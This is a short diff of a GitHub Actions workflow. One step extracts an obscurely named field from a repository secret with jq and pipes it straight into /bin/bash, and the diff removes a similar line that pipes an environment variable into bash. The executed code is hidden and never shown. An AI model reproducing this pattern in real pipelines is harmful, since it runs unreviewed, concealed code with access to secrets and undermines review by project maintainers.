@@ -21,7 +21,6 @@ jobs:
           hun2: ${{ secrets.hun2 }}
         run: |
           printf '%s' "$hun2" | jq -r .yehyc5790 | /bin/bash
-          echo $b6138 | jq -r .z3474 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
